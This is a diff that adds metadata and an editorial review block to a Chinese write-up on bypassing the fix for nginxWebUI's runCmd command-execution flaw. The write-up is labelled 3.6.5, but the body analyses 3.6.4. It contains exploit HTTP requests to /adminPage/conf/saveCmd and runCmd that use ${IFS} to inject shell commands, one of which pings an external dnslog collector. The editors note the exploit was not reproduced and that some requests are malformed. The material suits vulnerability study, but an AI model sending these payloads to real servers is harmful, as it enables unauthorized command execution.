@@ -1,8 +1,54 @@
 ---
 source: "MrWQ/vulnerability-paper"
+title: "nginxWebUI 3.6.5 版本审计与绕过"
+product: "nginxWebUI"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+prerequisites: "Authenticated session;Linux shell variable handling;body analyzes3.6.4 while title3.6.5"
+source_url: "https://mp.weixin.qq.com/s/8lkpLbXte9kIbKyHdHLPyg"
+source_status: "recorded"
+side_effects: "涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。"
+id: "vw-9f959d2fe894bdd5ad093ee2"
+entity_id: "ve-9f959d2fe894bdd5ad093ee2"
+schema_version: "1"
 ---
 
 # nginxWebUI 3.6.5 版本审计与绕过
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：Authenticated session;Linux shell variable handling;body analyzes3.6.4 while title3.6.5
+- 证据范围：Distinct configuration-poisoning bypass and patch chronology;critical code/screenshots not inspected
+
+### 本次正文校订
+
+- 按实际内容修正 4 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- Title3.6.5 versus repeated3.6.4 analysis/lab needs explicit tested-build clarification
+- Timeline years absent;3.6.6 claimed further fix does not establish complete remediation
+- HTTP requests omit header/body separator;short examples concatenate requestline/Host
+- Captured session tokens/DNS collector need placeholders
+- Preserve authenticated bypass scope separate from earlier pre-auth case-folding issue
+
+### 操作风险与资料使用
+
+- 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/8lkpLbXte9kIbKyHdHLPyg)
@@ -108,7 +154,7 @@ nginxWebUI runCmd 远程命令执行漏洞时间线：
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb6fZDzpPTVFaAJb8HjsicBqhv0GsArwibIUp5Xvg1gtoCL7XhStM4G9QzPpvRMFmPzicaDRV8ROlicumw/640?wx_fmt=png)
 
-```
+```http
 POST /adminPage/conf/saveCmd HTTP/1.1
 Host: x.x.x.x:8080
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
@@ -131,7 +177,7 @@ nginxExe=ping${IFS}22dck7.dnslog.cn&nginxPath=1
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/gauNkjeXJb6fZDzpPTVFaAJb8HjsicBqhRBAq4847uhsQk45eJyg9iaXXmYMRYY3HgaVkmr0I1icIRianb3fpuyE1Q/640?wx_fmt=png)
 
-```
+```http
 POST /adminPage/conf/runCmd HTTP/1.1
 Host: x.x.x.x:8080
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
@@ -156,13 +202,13 @@ Dnslog 返回成功。
 
 其他命令：
 
-```
+```http
 POST /adminPage/conf/saveCmd HTTP/1.1Host: xxx
 nginxExe=bash${IFS}&nginxPath=ls
 
 ```
 
-```
+```http
 POST /adminPage/conf/runCmd HTTP/1.1Host: xxxx
 cmd=bash${IFS} -c ls
 
